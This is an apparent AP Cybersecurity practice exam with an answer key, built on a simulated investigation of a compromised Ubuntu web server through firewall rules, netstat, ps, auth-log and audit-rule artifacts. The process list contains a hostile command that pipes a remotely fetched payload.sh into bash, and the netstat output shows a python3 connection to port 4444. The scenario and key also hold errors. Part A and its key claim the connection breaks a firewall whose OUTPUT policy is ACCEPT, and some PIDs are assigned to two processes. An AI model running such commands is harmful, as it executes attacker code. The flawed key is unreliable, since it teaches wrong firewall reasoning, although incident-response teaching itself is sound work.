# FRQ Practice Set 1 — Device Security Analysis (Set A)

**AP Cybersecurity — ICA 2026-27**  
**Format**: Device Security Analysis FRQ (matches official AP exam)  
**Time**: 50 minutes  
**Date**: Apr 20, 2027  
**Points**: 14

---

## Scenario: Compromised Web Server Investigation

You are a security analyst investigating a suspected compromise of a Linux web server (`web-prod-01`, IP: 10.0.5.22). The server runs Ubuntu 22.04 with Apache 2.4.52, hosting a PHP application. Anomalous outbound connections were detected by the network IDS at 03:42 UTC.

You have been provided with the following artifacts collected from the server:

---

### Source 1: Firewall Configuration (`/etc/ufw/user.rules`)

```
# UFW rules for web-prod-01
*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]

# Allow SSH from management subnet
-A INPUT -s 10.0.1.0/24 -p tcp --dport 22 -j ACCEPT

# Allow HTTP/HTTPS from anywhere
-A INPUT -p tcp --dport 80 -j ACCEPT
-A INPUT -p tcp --dport 443 -j ACCEPT

# Allow outbound DNS
-A OUTPUT -p udp --dport 53 -j ACCEPT
-A OUTPUT -p tcp --dport 53 -j ACCEPT

# Allow outbound NTP
-A OUTPUT -p udp --dport 123 -j ACCEPT

# Log and drop everything else
-A INPUT -j LOG --log-prefix "UFW-BLOCK: "
-A INPUT -j DROP

COMMIT
```

---

### Source 2: Netstat Output (collected 03:45 UTC)

```
Proto  Local Address          Foreign Address        State       PID/Program name
tcp    0      0  0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd
tcp    0      0  0.0.0.0:80              0.0.0.0:*               LISTEN      5678/apache2
tcp    0      0  0.0.0.0:443             0.0.0.0:*               LISTEN      5678/apache2
tcp    0      0  10.0.5.22:443           203.0.113.45:52834    ESTABLISHED 5678/apache2
tcp    0      0  10.0.5.22:443           198.51.100.12:49182   ESTABLISHED 5678/apache2
tcp    0      0  10.0.5.22:39842         192.168.100.50:4444   ESTABLISHED 9999/python3
tcp    0      0  10.0.5.22:51234         198.51.100.12:443     TIME_WAIT   -
tcp    0      0  10.0.5.22:51235         198.51.100.12:443     TIME_WAIT   -
udp    0      0  0.0.0.0:53              0.0.0.0:*                           1111/systemd-resolve
udp    0      0  0.0.0.0:123             0.0.0.0:*                           1111/systemd-timesyncd
```

---

### Source 3: Process List (`ps aux` collected 03:45 UTC)

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168492 11232 ?        Ss   Mar15   0:02 /sbin/init
root      1111  0.0  0.0  45212  3212 ?        Ss   Mar15   0:01 /lib/systemd/systemd-resolve
root      1111  0.0  0.0  45212  3212 ?        Ss   Mar15   0:01 /lib/systemd/systemd-timesyncd
root      1234  0.0  0.1  89232  5432 ?        Ss   Mar15   0:00 sshd: /usr/sbin/sshd -D
www-data  5678  0.1  2.3 452188 234560 ?       Ss   Mar15   1:23 /usr/sbin/apache2 -k start
www-data  5679  0.0  0.5 452188  54320 ?       S    Mar15   0:00 /usr/sbin/apache2 -k start
www-data  5680  0.0  0.5 452188  54320 ?       S    Mar15   0:00 /usr/sbin/apache2 -k start
www-data  5681  0.0  0.5 452188  54320 ?       S    Mar15   0:00 /usr/sbin/apache2 -k start
root      9999  2.3  0.8 123456  81234 ?        S    03:41   0:12 python3 /tmp/.update/check.py
root      9999  2.3  0.8 123456  81234 ?        S    03:41   0:12 python3 /tmp/.update/check.py
root     10000  0.0  0.1  12344  2345 ?        S    03:42   0:00 sh -c curl -s http://192.168.100.50:8080/payload.sh | bash
```

---

### Source 4: Authentication Log (`/var/log/auth.log` excerpt, 03:30–03:50 UTC)

```
Mar 20 03:30:01 web-prod-01 CRON[9900]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 20 03:30:01 web-prod-01 CRON[9900]: pam_unix(cron:session): session closed for user root
Mar 20 03:35:12 web-prod-01 sshd[9950]: Accepted password for admin from 10.0.1.50 port 49212 ssh2
Mar 20 03:35:12 web-prod-01 sshd[9950]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 20 03:35:45 web-prod-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Mar 20 03:35:45 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)
Mar 20 03:40:22 web-prod-01 sshd[9988]: Failed password for root from 203.0.113.45 port 58234 ssh2
Mar 20 03:40:25 web-prod-01 sshd[9988]: Failed password for root from 203.0.113.45 port 58234 ssh2
Mar 20 03:40:28 web-prod-01 sshd[9988]: Failed password for root from 203.0.113.45 port 58234 ssh2
Mar 20 03:40:28 web-prod-01 sshd[9988]: Connection closed by authenticating user 203.0.113.45 port 58234 ssh2
Mar 20 03:41:15 web-prod-01 CRON[9999]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 20 03:41:15 web-prod-01 CRON[9999]: pam_unix(cron:session): session closed for user root
```

---

### Source 5: Audit Rules (`/etc/audit/rules.d/audit.rules`)

```
# Audit rules for web-prod-01
-D
-b 8192
-f 1

# Monitor file access on web root
-w /var/www/html/ -p wa -k webroot_changes

# Monitor sensitive file changes
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k identity
-w /etc/ssh/sshd_config -p wa -k ssh_config

# Monitor privilege escalation
-a always,exit -F arch=b64 -S execve -F uid=0 -k priv_esc
-a always,exit -F arch=b64 -S setuid -k priv_esc

# Monitor network connections
-a always,exit -F arch=b64 -S connect -k network_connect

# Make configuration immutable
-e 2
```

---

## Questions

### Part A (3 points)
**Identify the suspicious network connection** in Source 2 (netstat output). Provide the **local port**, **remote IP and port**, **process name and PID**, and explain **why this connection violates the firewall policy** in Source 1.

### Part B (3 points)
**Analyze the process list** in Source 3. Identify **two indicators of compromise (IOCs)** related to the suspicious process (PID 9999). For each IOC, explain **what it suggests** about the attacker's activity.

### Part C (3 points)
**Correlate the authentication log** (Source 4) with the suspicious process (PID 9999, started at 03:41). What **specific log entry** explains how the attacker gained the privileges to launch this process? Identify the **MITRE ATT&CK technique** (Tactic + Technique ID) demonstrated.

### Part D (3 points)
The firewall (Source 1) allows **outbound DNS (UDP/53) and NTP (UDP/123)**. The suspicious connection uses **TCP port 4444** to **192.168.100.50**. Propose **two firewall rule changes** that would have blocked this connection while maintaining legitimate server functionality. For each, explain the **trade-off**.

### Part E (2 points)
The audit rules (Source 5) include monitoring for `execve` by uid=0. Would this rule have **generated an audit event** for the suspicious process (PID 9999)? Justify your answer based on the process list (Source 3) and audit rule syntax.

---

## Scoring Rubric (14 Points)

| Part | Points | Key Elements |
|------|--------|--------------|
| A | 3 | Local port 39842, remote 192.168.100.50:4444, PID 9999 python3, firewall allows OUTPUT but not this specific connection (OUTPUT ACCEPT is default, but connection is to RFC1918 address not in allowed outbound) |
| B | 3 | IOC 1: Process running from `/tmp/.update/check.py` (hidden directory, suspicious name) → persistence/dropped payload. IOC 2: Running as root (UID 0) → privilege escalation. IOC 3: High CPU (2.3%) at 03:41 → active beaconing. |
| C | 3 | Log entry: `03:35:45 sudo: admin : COMMAND=/bin/bash` → admin escalated to root. Technique: T1548.003 (Abuse Elevation Control Mechanism: Sudo) or T1068 (Exploitation for Privilege Escalation) — Privilege Escalation tactic. |
| D | 3 | 1) Change OUTPUT default to DROP, add explicit allow for required outbound (apt, updates). Trade-off: breaks auto-updates unless mirrors whitelisted. 2) Add `-A OUTPUT -d 192.168.0.0/16 -j DROP` (block RFC1918 outbound). Trade-off: may break legitimate internal API calls. |
| E | 2 | Yes. Rule: `-a always,exit -F arch=b64 -S execve -F uid=0 -k priv_esc`. Process runs as root (uid=0), execve called when python3 launches. Would trigger with key "priv_esc". |

---

*FRQ Practice Set 1 — Administered Apr 20, 2027 — Upload to qsec_ap_review/frq-practice/*